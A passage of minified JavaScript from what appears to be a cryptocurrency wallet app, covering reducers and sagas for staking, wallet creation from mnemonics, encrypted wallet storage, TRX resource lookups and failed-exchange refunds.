            te.getType)(lb.setLoadingStart)]: setLoadingStart,
            [(0,
            te.getType)(lb.setLoadingStop)]: setLoadingStop,
            [(0,
            te.getType)(lb.setCurrentEpoch)]: setCurrentEpoch,
            [(0,
            te.getType)(lb.setStakeInfoByWallet)]: setStakeInfoByWallet,
            [(0,
            te.getType)(lb.setStakingVars)]: setStakingVars,
            [(0,
            te.getType)(lb.startOnceStakingInfoUpdate)]: startOnceStakingInfoUpdate,
            [(0,
            te.getType)(lb.finishOnceStakingInfoUpdate)]: finishOnceStakingInfoUpdate,
            [(0,
            te.getType)(lb.setIsOneTimeFetchStart)]: setIsOneTimeFetchStart,
            [(0,
            te.getType)(lb.setIsOneTimeFetchEnd)]: setIsOneTimeFetchEnd
        })
          , fce = {
            name: M_,
            storeKey: M_,
            whitelist: ["stakeInfoStorage"],
            reducer: pce
        }
          , Ece = {
            setClearStore: (0,
            te.createAction)(gae)(),
            setLoadingStart: (0,
            te.createAction)(vae)(),
            setLoadingStop: (0,
            te.createAction)(_ae)(),
            setTotalStakingAmount: (0,
            te.createAction)(yae)(),
            initializeUpdater: (0,
            te.createAction)(wae)(),
            updateStakingInfoPeriodically: (0,
            te.createAction)(bae)(),
            updateStakingInfoOneItem: (0,
            te.createAction)(kae)()
        }
          , hce = {
            isLoading: !1,
            totalStakingAmount: void 0,
            stakeInfo: void 0
        }
          , earn_reducer_setClearStore = () => ({
            ...hce
        })
          , earn_reducer_setLoadingStart = e => ({
            ...e,
            isLoading: !0
        })
          , earn_reducer_setLoadingStop = e => ({
            ...e,
            isLoading: !1
        })
          , setTotalStakingAmount = (e, t) => ({
            ...e,
            totalStakingAmount: t.payload
        })
          , updateStakingInfoOneItem = (e, t) => {
            const a = undefined
              , n = {
                [t.payload.meta.uuid]: t.payload
            };
            return {
                ...e,
                stakeInfo: {
                    ...e.stakeInfo,
                    ...n
                }
            }
        }
          , gce = (0,
        gw.Lq)(hce, {
            [(0,
            te.getType)(Ece.setClearStore)]: earn_reducer_setClearStore,
            [(0,
            te.getType)(Ece.setLoadingStart)]: earn_reducer_setLoadingStart,
            [(0,
            te.getType)(Ece.setLoadingStop)]: earn_reducer_setLoadingStop,
            [(0,
            te.getType)(Ece.setTotalStakingAmount)]: setTotalStakingAmount,
            [(0,
            te.getType)(Ece.updateStakingInfoOneItem)]: updateStakingInfoOneItem
        })
          , yce = {
            name: hae,
            reducer: gce
        }
          , vce = {
            setFletcherIcons: (0,
            te.createAction)(Yn)(),
            fetchFletcherIcons: (0,
            te.createAction)(qn)()
        }
          , _ce = "fletcher-icons"
          , wce = {
            fletcherIcons: []
        }
          , icons_reducer_setClearStore = () => ({
            ...wce
        })
          , setFletcherIcons = (e, t) => ({
            ...e,
            fletcherIcons: t.payload.fletcherIcons
        })
          , bce = {
            [(0,
            te.getType)(vce.setFletcherIcons)]: setFletcherIcons,
            [(0,
            te.getType)(ne)]: icons_reducer_setClearStore
        }
          , kce = {
            name: Zn,
            reducer: (0,
            Ru.Z)(bce, wce)
        }
          , Sce = {
            list: {},
            fetchError: void 0
        }
          , spam_token_info_reducer_setClearStore = () => ({
            ...Sce
        })
          , setSpamTokenList = (e, t) => ({
            ...e,
            list: t.payload.list
        })
          , spam_token_info_reducer_setFetchError = (e, t) => ({
            ...e,
            fetchError: t.payload.error
        })
          , Cce = (0,
        gw.Lq)(Sce, {
            [(0,
            te.getType)(hh.setClearStore)]: spam_token_info_reducer_setClearStore,
            [(0,
            te.getType)(hh.setSpamTokenList)]: setSpamTokenList,
            [(0,
            te.getType)(hh.setFetchError)]: spam_token_info_reducer_setFetchError
        })
          , Nce = {
            name: Fd,
            storeKey: Fd,
            reducer: Cce
        }
          , Tce = undefined
          , Ace = (0,
        Mle.UY)({
            [TB.name]: TB.reducer,
            [fce.name]: fce.reducer,
            [Fo]: Pu,
            [Ire]: Pre,
            [yoe.name]: yoe.reducer,
            [xE]: FE,
            [yx]: _x,
            [ju]: Zu,
            [Mu]: Uu,
            [Nm]: Am,
            [_ie.storeKey]: _ie.reducer,
            [tce]: nce,
            [yt]: vt,
            [Sd.storeKey]: Sd.reducer,
            [ou]: hu,
            [ld]: cd,
            [Xb]: ek,
            [Hj]: $j,
            [Fre]: Bre,
            [gs]: vs,
            [rce]: sce,
            [_d]: bd,
            [cm]: mm,
            [Tt]: It,
            [toe.storeKey]: toe.reducer,
            [aoe.storeKey]: aoe.reducer,
            [lB]: cB,
            [pR]: hR,
            [noe]: soe,
            [JK]: tH,
            [Xx]: Jx,
            [Ax]: Ix,
            [NZ]: AZ,
            [TI]: xI,
            [YI]: XI,
            [gR]: _R,
            [Ku]: Hu,
            [ooe]: moe,
            [CA]: NA,
            [w3]: S3,
            [l$]: c$,
            [px]: hx,
            [ice]: cce,
            [kce.name]: kce.reducer,
            [Eoe.name]: Eoe.reducer,
            [yce.name]: yce.reducer,
            receive: XA,
            payment: eoe,
            [Nce.name]: Nce.reducer,
            [Ac.Fn]: Ac.I6
        });
        function *updateAllWalletsUseCase() {
            yield put(updateAllWallets())
        }
        function *startUpdateInternalTxs() {
            const e = 18e4;
            for (; ; ) {
                yield(0,
                Df.gw)(e);
                yield(0,
                Df.gz)(updateInternalTxs())
            }
        }
        function *updateWalletsDataPeriodically() {
            yield(0,
            Df.Cs)(startUpdateInternalTxs)
        }
        function *walletUpdater() {}
        function *walletUpdaterSaga() {
            yield(0,
            Df.Cs)(walletUpdater)
        }
        const xce = 75
          , Ice = 100
          , Pce = new wu.default({
            concurrency: 75
        });
        function *update(e) {
            let {wallets: t} = e
              , a = t;
            for (; a.length; ) {
                const e = a.slice(0, xce);
                a = a.slice(xce);
                yield(0,
                Df.$6)(e.map((function*(e) {
                    yield(0,
                    Df.xN)(updateSomeWallets({
                        wallets: [e],
                        walletsQueue: Pce,
                        options: {
                            force: !0
                        }
                    }))
                }
                )));
                yield(0,
                Df.gw)(Ice)
            }
        }
        function *updateAllWalletsV2() {
            yield(0,
            Df.gz)(ot(!0));
            const e = yield(0,
            Df.Ys)($c);
            yield(0,
            Df.RE)(update, {
                wallets: e
            });
            yield(0,
            Df.gz)(ot(!1))
        }
        function *watchUpdateAllWalletsV2() {
            yield(0,
            Df.ib)((0,
            te.getType)(dt), updateAllWalletsV2)
        }
        const Lce = [(0,
        Df.rM)(walletUpdaterSaga), (0,
        Df.rM)(watchUpdateAllWalletsV2)];
        function *onValidateRewardData(e) {
            var t;
            let {meta: a} = e;
            const n = yield*(0,
            Of.Ys)(hZ, {
                uuid: null !== (t = null == a ? void 0 : a.uuid) && void 0 !== t ? t : ""
            })
              , r = yield*(0,
            Of.Ys)((e => PP(stakingSelector(e), a)));
            if (!n)
                throw Error("Wallet data is undefined");
            const {address: l, currency: s, uuid: i, privateKey: o="", balance: c} = n
              , u = yield*(0,
            Of.RE)(ec.claimTxFee, {
                address: l,
                currency: s,
                uuid: i,
                balance: c,
                privateKey: o
            })
              , d = undefined
              , m = {
                address: l,
                privateKey: o,
                balance: c,
                reward: ( () => {
                    var e;
                    if (Array.isArray(r)) {
                        var t, a;
                        return null !== (t = null === (a = r[0]) || void 0 === a ? void 0 : a.reward) && void 0 !== t ? t : 0
                    }
                    return null !== (e = null == r ? void 0 : r.reward) && void 0 !== e ? e : 0
                }
                )(),
                fee: u
            };
            return yield*validateSaga(Gw, X$, m)
        }
        function *watchValidateRewardData() {
            yield*(0,
            Of.Fm)(Uw.type, onValidateRewardData)
        }
        function *onStakingModuleInitRequest(e) {
            let {meta: t} = e;
            return yield*request(Ow, ec.info, t)
        }
        function *watchOnVisitStakingInfoModule() {
            return yield*lifeCycleSaga(Ww, Bw.type, onStakingModuleInitRequest)
        }
        function *onClaimCloRequest(e) {
            let {meta: t} = e;
            const {uuid: a, contractAddress: n} = t
              , r = yield*(0,
            Of.Ys)(hZ, {
                uuid: null != a ? a : ""
            });
            if (!r)
                throw Error("Wallet is undefined");
            return yield*request(zw, ec.claim, {
                wallet: r,
                contractAddress: n
            })
        }
        function *watchClaimClo() {
            yield*(0,
            Of.Fm)(Hw.type, onClaimCloRequest)
        }
        function *onWithdrawCloRequest(e) {
            let {meta: t} = e;
            const {uuid: a, contractAddress: n} = t
              , r = yield*(0,
            Of.Ys)(hZ, {
                uuid: null != a ? a : ""
            });
            if (!r)
                throw Error("Wallet is undefined");
            return yield*request(Yw, ec.withdraw, {
                wallet: r,
                contractAddress: n
            })
        }
        function *watchWithdrawClo() {
            yield*(0,
            Of.Fm)(Zw.type, onWithdrawCloRequest)
        }
        function *onUpdateBalance(e) {
            let {meta: t} = e;
            const {uuid: a} = t;
            try {
                const e = yield*(0,
                Of.Ys)((e => eu(e)(a)));
                yield*(0,
                Of.gz)(Aw("Updating wallet balance..."));
                yield*(0,
                Of.xN)(updateBalanceByWallet(e, !0));
                yield*(0,
                Of.gz)(Aw(""));
                return yield*(0,
                Of.Ys)((e => hZ(e, {
                    uuid: a
                })))
            } catch (e) {
                yield*(0,
                Of.gz)(Aw(""));
                console.debug(e)
            }
            return null
        }
        function *watchOnUpdateBalance() {
            return yield*(0,
            Of.Fm)(Iw.type, onUpdateBalance)
        }
        function *onStakingPageInitRequest(e) {
            let {meta: t} = e;
            const {start: a, success: n, error: r, cancel: l} = tb
              , {fromWallet: s, amount: i=0, additionalSend: o} = t
              , {uuid: c, currency: u} = s
              , d = yield*(0,
            Of.Ys)(hZ, {
                uuid: c
            });
            if (!d)
                throw Error("Wallet is undefined");
            try {
                yield*(0,
                Of.gz)(a(t));
                yield*(0,
                Of.gz)(Aw(`Loading ${(0,
                be.xG)(null == d ? void 0 : d.currency)} Blockchain adapter...`));
                const e = String(Qo)
                  , r = yield*(0,
                Of.RE)(ec.fetchGasPrice, {
                    currency: u
                });
                yield*(0,
                Of.gz)(Aw("Loading Fee..."));
                const s = yield*(0,
                Of.RE)(ec.fetchFee, {
                    fromWallet: d,
                    amount: i,
                    additionalSend: {
                        gasLimit: e,
                        gasPrice: r,
                        ...o
                    }
                })
                  , c = null != s ? s : {
                    gasLimit: e,
                    gasPrice: r
                };
                yield*(0,
                Of.gz)(n(c, t));
                return c
            } catch (e) {
                yield*(0,
                Of.gz)(r(e, t));
                return e
            } finally {
                (yield*(0,
                Of.By)()) && (yield*(0,
                Of.gz)(l(t)))
            }
        }
        function *watchOnVisitStakingPage() {
            return yield*lifeCycleSaga(Qw, eb.type, onStakingPageInitRequest)
        }
        function *onSendStakingTx(e) {
            let {meta: t} = e;
            const {start: a, success: n, error: r, cancel: l} = rb;
            try {
                const {walletFrom: e, params: s} = t
                  , {amount: i, gasPrice: o} = s;
                yield*(0,
                Of.gz)(a(t));
                const c = yield*(0,
                Of.RE)(onUpdateBalance, Iw({
                    uuid: e
                }));
                if (!c)
                    throw Error("Wallet is undefined");
                const {gasLimit: u} = yield*(0,
                Of.RE)(onStakingPageInitRequest, eb({
                    amount: i,
                    fromWallet: c
                }));
                yield*(0,
                Of.gz)(Aw("Preparing transaction..."));
                const d = yield*(0,
                Of.RE)(ec.sendStakingTx, {
                    fromWallet: c,
                    params: {
                        ...s,
                        gasLimit: u,
                        gasPrice: o
                    }
                });
                if (d.error) {
                    yield*(0,
                    Of.gz)(r({
                        request: d.error
                    }, t));
                    return d.error
                }
                if (d.hash) {
                    cc.$.send(cc.d.STAKING_SEND, "clo");
                    yield(0,
                    Of.gz)(transactions_addPendingTx(d.pendingTx));
                    yield(0,
                    Of.gz)(n(d, t))
                }
                return d
            } catch (e) {
                yield*(0,
                Of.gz)(r({
                    request: e
                }, t));
                return e
            } finally {
                (yield*(0,
                Of.By)()) && (yield*(0,
                Of.gz)(l(t)))
            }
        }
        function *watchOnSentStakingTx() {
            return yield*(0,
            Of.Fm)(nb.type, onSendStakingTx)
        }
        const Fce = undefined
          , Wce = [...[(0,
        Of.rM)(watchOnVisitStakingInfoModule), (0,
        Of.rM)(watchOnVisitStakingPage), (0,
        Of.rM)(watchClaimClo), (0,
        Of.rM)(watchWithdrawClo), (0,
        Of.rM)(watchValidateRewardData), (0,
        Of.rM)(watchOnSentStakingTx), (0,
        Of.rM)(watchOnUpdateBalance)]]
          , Rce = Jn()((async () => {
            try {
                const {data: {response: e}} = await bc.w.get("icons");
                return {
                    type: "FETCH_ICONS_SUCCESS",
                    fletcherIcons: e
                }
            } catch (e) {
                return {
                    type: "FETCH_ICONS_ERROR",
                    description: (null == e ? void 0 : e.message) || e
                }
            }
        }
        ));
        function *fetchFletcherIcons() {
            const e = yield(0,
            Df.RE)(Rce);
            if ("FETCH_ICONS_SUCCESS" === e.type)
                yield(0,
                Df.gz)(vce.setFletcherIcons({
                    fletcherIcons: e.fletcherIcons
                }))
        }
        function *fetchCustomFletcherIcons() {
            yield(0,
            Df.ib)((0,
            te.getType)(vce.fetchFletcherIcons), fetchFletcherIcons)
        }
        const Bce = [(0,
        Df.rM)(fetchCustomFletcherIcons)];
        async function fetchResources(e) {
            try {
                const t = await Se.Z.getApiByCurrency("trx")
                  , a = await t.getResources({
                    address: e.address
                })
                  , n = a.freeNetLimit || 0 === a.freeNetLimit ? a.freeNetLimit.toString() : "NaN"
                  , r = a.freeNetUsed || 0 === a.freeNetUsed ? a.freeNetUsed.toString() : "0"
                  , l = n && r ? (0,
                Ko.h9)(n, r).toString() : "NaN"
                  , s = `${a.energyLimit}`
                  , i = `${a.energyUsed}`
                  , o = undefined;
                return {
                    netLimit: n,
                    netUsed: r,
                    netAvailable: l,
                    energyLimit: s,
                    energyUsed: i,
                    energyAvailable: `${parseInt((0,
                    Ko.h9)(s, i)) < 0 ? "0" : (0,
                    Ko.h9)(s, i)}`
                }
            } catch (e) {
                return {
                    netLimit: "NaN",
                    netUsed: "NaN",
                    netAvailable: "NaN",
                    energyLimit: "NaN",
                    energyUsed: "NaN",
                    energyAvailable: "NaN"
                }
            }
        }
        function *fetchTrxWalletResources(e) {
            const {walletId: t, address: a} = e.payload
              , n = yield(0,
            Df.Ys)(Oc, t);
            if (null != n && n.loading)
                return;
            yield(0,
            Df.gz)(ad({
                walletId: t
            }));
            const r = yield(0,
            Df.RE)(fetchResources, {
                address: a
            });
            yield(0,
            Df.gz)(nd({
                uuid: t,
                resources: r
            }))
        }
        function *_mapDecryptedSecureStorage(e) {
            const t = yield(0,
            Of.Ys)(oe.A0)
              , a = yield(0,
            Of.Ys)(oe.P2);
            if (!t)
                return;
            const n = e(t)
              , r = Q.AES.encrypt(JSON.stringify(n), a).toString();
            yield(0,
            Of.gz)(ie.storageSaveAndTryFlush({
                data: r
            }))
        }
        function *mapDecryptedSecureStorageCase(e) {
            try {
                yield*_mapDecryptedSecureStorage(e.payload.mapper)
            } catch (e) {
                Wc.i2.error("addWalletCase failed", e)
            }
        }
        function *_mergeWalletsIntoSecureStorage(e, t) {
            const a = mapWalletsToPlainObjects(e)
              , n = yield(0,
            Of.Ys)($c)
              , r = mapWalletsToPlainObjects(n)
              , l = r.slice()
              , s = new Set(r.map((e => `${e.address}_${e.currency}`)));
            for (const e of a)
                if (!s.has(`${e.address}_${e.currency}`)) {
                    if (e.derivedFromMnemonicUsing) {
                        var i;
                        null !== (i = e.privateKey) && void 0 !== i && i.mnemonic || (e.privateKey = {
                            mnemonic: t,
                            privateKey: e.privateKey
                        })
                    }
                    l.push(e);
                    s.add(`${e.address}_${e.currency}`)
                }
            yield(0,
            Of.gz)(rd.replaceWalletsCommit({
                newWallets: l
            }));
            yield*_mapDecryptedSecureStorage((e => ({
                ...e,
                wallets: l
            })))
        }
        function *mergeWalletsCase(e) {
            try {
                yield*_mergeWalletsIntoSecureStorage(e.payload.newWallets, e.payload.mnemonic)
            } catch (e) {
                console.error("margeWalletsCase", e);
                Wc.i2.error("margeWalletsCase failed", e)
            }
        }
        function *addWallet(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            try {
                e.storeManager || e.setStoreManager(getStoreManager());
                const a = yield(0,
                Of.Ys)($c);
                Object.assign(e, patchWalletTitle(e, a));
                a.push(e);
                yield*_mergeWalletsIntoSecureStorage(a);
                t && !0 === t.isSilent || (yield(0,
                Of.xN)(addNotifyBackup()));
                t && null != t && t.downloadType && (yield(0,
                Of.xN)(handleDownload(t.downloadType)));
                yield(0,
                Of.RE)(e.fetchSubWallets);
                yield(0,
                Of.xN)(replaceWalletsFromWalletModels(a));
                yield(0,
                Of.xN)(setWalletSocketListeners(e));
                yield(0,
                Of.xN)(startSocketManager());
                yield(0,
                Of.xN)(fetchAllFIOInfo());
                yield(0,
                Of.xN)(fetchMultisigs());
                return !0
            } catch (e) {
                Wc.i2.error("addWallet reducer failed", e);
                return !1
            }
        }
        function *addWalletCase_addSubWallet(e) {
            const t = yield(0,
            Of.Ys)($c)
              , a = null == t ? void 0 : t.filter((t => (null == t ? void 0 : t.uuid) !== e.uuid));
            a.push(e);
            yield*_mergeWalletsIntoSecureStorage(a);
            yield(0,
            Of.xN)(replaceWalletsFromWalletModels(a));
            yield(0,
            Of.xN)(addNotifyBackup())
        }
        function *addWalletCase(e) {
            try {
                yield*addWallet(e.payload.wallet, e.payload.options)
            } catch (e) {
                Wc.i2.error("addWalletCase failed", e)
            }
        }
        const findToken = async (e, t, a) => {
            const n = await fetchFletcherTokens();
            return a ? null == n ? void 0 : n.find((n => {
                var r;
                return n.ticker === e && n.family === t && (null === (r = n.contract) || void 0 === r ? void 0 : r.toLowerCase()) === a.toLowerCase()
            }
            )) : null == n ? void 0 : n.find((a => a.ticker === e && a.family === t))
        }
          , createWalletApi = async e => {
            let {newCurrency: t, smartContract: a, parentWallet: n, backupWallets: r, mnemonic: l, isMnemonicBackup: s, captchaCode: i, isCoin: o} = e
              , c = {}
              , u = null;
            const d = !(o || n instanceof to.Z)
              , m = (o ? t : (null == n ? void 0 : n.family) || n.currency).toLowerCase();
            if (o || d) {
                const e = Se.Z.getMetadata({
                    ticker: m
                })
                  , t = await Se.Z.getApiByCurrency(m)
                  , a = _e.ZP.getClass({
                    currency: m
                });
                if (s && l && dd.includes(m)) {
                    const n = getNewAccountIndexCoin({
                        currency: m,
                        backupWallets: r
                    })
                      , s = getNewTitleCoin({
                        currency: m,
                        backupWallets: r
                    })
                      , o = `${(null == e ? void 0 : e.title) || m}${Number(s) ? ` ${s}` : ""}`;
                    try {
                        const e = await t.getAddressFromMnemonic({
                            mnemonic: l,
                            accountIndex: n,
                            code: i
                        })
                          , {privateKey: s, address: u} = e
                          , d = r.find((e => e.currency === m && e.address === u));
                        if (d)
                            c = await (new a).create({
                                currency: m,
                                code: i
                            });
                        else {
                            const t = {
                                uuid: generateWalletUUID({
                                    mnemonic: l,
                                    address: u,
                                    currency: m
                                }),
                                currency: m,
                                address: u,
                                privateKey: s,
                                title: o,
                                balance: "0",
                                subWallets: [],
                                derivedFromMnemonicUsing: {
                                    accountIndex: n
                                }
                            };
                            "publicKey"in e && Object.assign(t, {
                                publicKey: e.publicKey
                            });
                            "accountName"in e && Object.assign(t, {
                                accountName: e.accountName
                            });
                            "legacyAddress"in e && Object.assign(t, {
                                legacyAddress: e.legacyAddress
                            });
                            "rewardAddress"in e && Object.assign(t, {
                                rewardAddress: e.rewardAddress
                            });
                            c = (new a).recoverFromPlainObject(t)
                        }
                    } catch (e) {
                        return "message"in e ? {
                            error: e.message
                        } : {
                            error: "Something went wrong"
                        }
                    }
                } else
                    c = await (new a).create({
                        currency: m,
                        code: i
                    })
            }
            if (!o) {
                const e = await findToken(t, (null == n ? void 0 : n.family) || n.currency, a)
                  , s = getNewTitleIndexToken({
                    currency: t,
                    backupWallets: r
                })
                  , i = `${(null == e ? void 0 : e.title) || (null == e ? void 0 : e.ticker) || (0,
                L7.Z)(t)}${s ? ` ${s}` : ""}`;
                if (n instanceof to.Z) {
                    u = await n.addSubWallet({
                        uuid: generateWalletUUID({
                            mnemonic: l,
                            address: n.address,
                            currency: t,
                            family: null == e ? void 0 : e.family
                        }),
                        title: i,
                        currency: t,
                        family: null == e ? void 0 : e.family,
                        precision: parseInt(String((null == e ? void 0 : e.decimals) || 6), 10),
                        smartContract: null == e ? void 0 : e.contract,
                        address: null == n ? void 0 : n.address,
                        privateKey: n.privateKey,
                        balance: "0",
                        parentUuid: n.uuid
                    });
                    c = n
                } else {
                    var p;
                    u = await c.addSubWallet({
                        uuid: generateWalletUUID({
                            mnemonic: l,
                            address: c.address,
                            currency: t,
                            family: null == e ? void 0 : e.family
                        }),
                        title: i,
                        currency: t,
                        family: null == e ? void 0 : e.family,
                        precision: parseInt(String((null == e ? void 0 : e.decimals) || 6), 10),
                        smartContract: null == e ? void 0 : e.contract,
                        address: null === (p = c) || void 0 === p ? void 0 : p.address,
                        privateKey: c.privateKey,
                        balance: "0",
                        parentUuid: c.uuid
                    })
                }
            }
            return {
                coinWallet: c,
                tokenWallet: u
            }
        }
        ;
        function *createWalletCase(e) {
            var t;
            const {parentWallet: a, currency: n, smartContract: r, downloadType: l, captchaCode: s, isCoin: i} = e.payload;
            try {
                const e = undefined;
                if (yield*(0,
                Of.Ys)(zc))
                    return;
                yield(0,
                Of.gz)(rd.setIsLoadingCreatingWallet(!0));
                yield(0,
                Of.gz)(rd.setNewCreatedWalletId({
                    walletId: null
                }));
                const t = yield(0,
                Of.Ys)(oe.s$)
                  , o = yield(0,
                Of.Ys)(oe.DU)
                  , c = yield(0,
                Of.Ys)(Bc)
                  , u = yield*(0,
                Of.RE)(createWalletApi, {
                    backupWallets: c,
                    smartContract: r,
                    newCurrency: n,
                    mnemonic: o,
                    isMnemonicBackup: t,
                    parentWallet: a,
                    captchaCode: s,
                    isCoin: i
                });
                if ("error"in u) {
                    yield(0,
                    Of.gz)(rd.setErrorCreatingWallet({
                        message: u.error
                    }));
                    return
                }
                const {coinWallet: d, tokenWallet: m} = u
                  , p = undefined;
                (yield*(0,
                Of.Ys)(eu))(d.uuid) || (yield*addWallet(d));
                if (m) {
                    yield*addWalletCase_addSubWallet(d);
                    yield(0,
                    Df.xN)(setActiveWallet(m));
                    yield(0,
                    Of.gz)(rd.setNewCreatedWalletId({
                        walletId: m.uuid
                    }));
                    ge.b.success(ge.d.ADD_WALLET_SUCCESS, {
                        key_currency: (null == m ? void 0 : m.currency) || (null == m ? void 0 : m.ticker)
                    })
                } else {
                    yield(0,
                    Df.xN)(setActiveWallet(d));
                    yield(0,
                    Of.gz)(rd.setNewCreatedWalletId({
                        walletId: d.uuid
                    }));
                    ge.b.success(ge.d.ADD_WALLET_SUCCESS, {
                        key_currency: (null == d ? void 0 : d.currency) || (null == d ? void 0 : d.ticker)
                    })
                }
                l && (yield(0,
                Df.xN)(handleDownload(l)));
                yield(0,
                Df.xN)(removeNotifyBackup())
            } catch (e) {
                ge.b.error(ge.d.FAILED_CREATE_WALLET_SAGA, {
                    currency: n,
                    parentWallet_currency: null == a ? void 0 : a.currency,
                    parentWallet_family: null == a ? void 0 : a.family
                }, e)
            }
            yield(0,
            Of.gz)(rd.setIsLoadingCreatingWallet(!1));
            if (null != e && null !== (t = e.payload) && void 0 !== t && t.setNewCoinOrToken) {
                var o;
                null == e || null === (o = e.payload) || void 0 === o || o.setNewCoinOrToken(null)
            }
        }
        function *replaceWallets(e) {
            const t = mapWalletsToPlainObjects(e);
            yield(0,
            Of.gz)(rd.replaceWalletsCommit({
                newWallets: t
            }));
            yield*_mapDecryptedSecureStorage((e => ({
                ...e,
                wallets: t
            })))
        }
        function *replaceWalletsCase(e) {
            try {
                yield*replaceWallets(e.payload.newWallets)
            } catch (e) {
                console.error("replaceWalletsCase", e);
                Wc.i2.error("replaceWalletsCase failed", e)
            }
        }
        function *removeWallet(e) {
            try {
                const t = (null == e ? void 0 : e.clone()) || e
                  , a = yield(0,
                Df.Ys)($c)
                  , n = mapWalletsToPlainObjects(a);
                let r = n;
                if (t.isSubWallet) {
                    const e = undefined
                      , a = (yield(0,
                    Df.Ys)(lu))(t.uuid)
                      , l = null == a ? void 0 : a.clone();
                    if (l) {
                        l.subWallets = l.subWallets.filter((e => e.uuid !== t.uuid));
                        r = n.map((e => e.uuid === l.uuid ? l : e))
                    }
                } else
                    r = n.filter((e => e.uuid !== t.uuid));
                r = mapWalletsToPlainObjects(r);
                yield(0,
                Of.gz)(rd.replaceWalletsCommit({
                    newWallets: r
                }));
                yield*_mapDecryptedSecureStorage((e => ({
                    ...e,
                    wallets: r
                })));
                yield*(0,
                Of.xN)(showWallet(t));
                yield*(0,
                Of.xN)(startSocketManager());
                removeWalletSocketListeners(t)
            } catch (e) {
                Wc.i2.error("removeWallet reducer failed", e)
            }
        }
        function *removeWalletCase(e) {
            try {
                yield*removeWallet(e.payload.wallet)
            } catch (e) {
                console.error("margeWalletsCase", e);
                Wc.i2.error("margeWalletsCase failed", e)
            }
        }
        function *updateWalletCase_updateWallet(e) {
            let {wallet: t, options: a} = e;
            try {
                const e = yield(0,
                Df.Ys)($c)
                  , n = e.find((e => t.isSubWallet && e.subWallets.length ? e.subWallets.some((e => t.uuid === e.uuid)) : t.uuid === e.uuid));
                if (!t || !n)
                    throw new Error("wallet or foundWallet is undefined");
                a && !0 === a.isSilent && n.title === t.title || (yield(0,
                Of.xN)(addNotifyBackup()));
                Object.assign(t, patchWalletTitle(t));
                t.isSubWallet ? n.subWallets.forEach((e => {
                    e.uuid === t.uuid && Object.assign(e, t)
                }
                )) : Object.assign(n, t);
                yield*replaceWallets(e)
            } catch (e) {
                Wc.i2.error("updateWallet reducer failed", e)
            }
        }
        function *updateWalletCase(e) {
            try {
                yield*updateWalletCase_updateWallet({
                    wallet: e.payload.wallet,
                    options: e.payload.options
                })
            } catch (e) {
                Wc.i2.error("updateWalletCase failed", e)
            }
        }
        function *walletsFetchTrxResourcesSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(td), fetchTrxWalletResources)
        }
        function *walletsCreateTop10CurrenciesSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(rd.createTop10Currencies), createTop10CurrenciesCase)
        }
        function *walletsCreateWalletSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(rd.createWallet), createWalletCase)
        }
        function *replaceWalletsSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(rd.replaceWallets), replaceWalletsCase)
        }
        function *removeWalletsSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(rd.removeWallet), removeWalletCase)
        }
        function *updateWalletSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(rd.updateWallet), updateWalletCase)
        }
        function *addWalletSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(rd.addWallet), addWalletCase)
        }
        function *mergeWalletsSaga() {
            yield(0,
            Df.ib)((0,
            te.getType)(rd.mergeWallets), mergeWalletsCase)
        }
        const Oce = [(0,
        Df.rM)(walletsFetchTrxResourcesSaga)]
          , Dce = [(0,
        Df.rM)(walletsCreateTop10CurrenciesSaga), (0,
        Df.rM)(walletsCreateWalletSaga), (0,
        Df.rM)(replaceWalletsSaga), (0,
        Df.rM)(removeWalletsSaga), (0,
        Df.rM)(updateWalletSaga), (0,
        Df.rM)(addWalletSaga), (0,
        Df.rM)(mergeWalletsSaga)]
          , Mce = ee.P.create({
            name: "reducer-exchanges"
        });
        class FailedExchangeApi {
            async getExchangeTxActions(e) {
                let {id: t} = e;
                try {
                    const {data: e} = await U.nW.get(`/api/v1/exchange/v2/get-transaction-actions/${t}`);
                    return e.transactionActions
                } catch (e) {
                    Mce.error("getExchangeTxActions reducer failed", e);
                    return {}
                }
            }
            static async updateStatusByAction(e) {
                let {id: t} = e;
                return new Promise((e => {
                    setTimeout(( () => {
                        U.nW.post("/api/v1/internal/exchanges/update-status", {
                            id: t
                        });
                        e()
                    }
                    ), 2e3)
                }
                ))
            }
            async continueFailedExchangeTx(e) {
                let {id: t} = e;
                try {
                    const {data: e} = await U.nW.post("/api/v1/exchange/v2/continue-transaction", {
                        id: t
                    });
                    e && e.transactionContinue && e.transactionContinue.result && await FailedExchangeApi.updateStatusByAction({
                        id: t
                    });
                    return e.transactionContinue
                } catch (e) {
                    Mce.error("continueFailedExchangeTx reducer failed", e);
                    return {
                        error: e,
                        success: !1,
                        result: !1
                    }
                }
            }
            async refundFailedExchangeTx(e) {
                try {
                    const {data: t} = await U.nW.post("/api/v1/exchange/v2/refund-transaction", e);
                    t && t.transactionRefund && t.transactionRefund.result && await FailedExchangeApi.updateStatusByAction({
                        id: e.id
                    });
                    return t.transactionRefund
                } catch (e) {
                    Mce.error("refundFailedExchangeTx reducer failed", e);
                    return {
                        result: !1,
                        error: e,
                        success: !1
                    }
                }
            }
        }
        const Uce = new FailedExchangeApi;
        function *onGetFailedExchangeTx(e) {
            let {meta: t} = e;
            return yield*request(yB, Uce.getExchangeTxActions, t)
        }
        function *watchGetFailedExchangeTx() {
            yield(0,
            Of.ib)(EB.type, onGetFailedExchangeTx)
        }
        function *onContinueFailedExchangeTx(e) {
            let {meta: t} = e;
            return yield*request(vB, Uce.continueFailedExchangeTx, t)
        }
        function *watchContinueFailedExchangeTx() {
            yield(0,
            Of.ib)(hB.type, onContinueFailedExchangeTx)
        }
        function *onRefundFailedExchangeTx(e) {
            let {meta: t} = e;
            return yield*request(_B, Uce.refundFailedExchangeTx, t)
        }
        function *watchRefundFailedExchangeTx() {
            yield(0,
            Of.ib)(gB.type, onRefundFailedExchangeTx)
        }
        const Gce = [(0,
        Of.rM)(watchGetFailedExchangeTx), (0,
        Of.rM)(watchContinueFailedExchangeTx), (0,
        Of.rM)(watchRefundFailedExchangeTx)]
          , fetchStakingInfoByWallet = async e => {
            try {
                const t = await Se.Z.getApiByWallet(e.wallet)
                  , a = e.validators && e.validators.length ? e.validators : [];
                if (t.fetchStakingInfo) {
                    const n = await t.fetchStakingInfo({
                        wallet: {
                            currency: e.wallet.currency,
                            balance: e.wallet.balance,
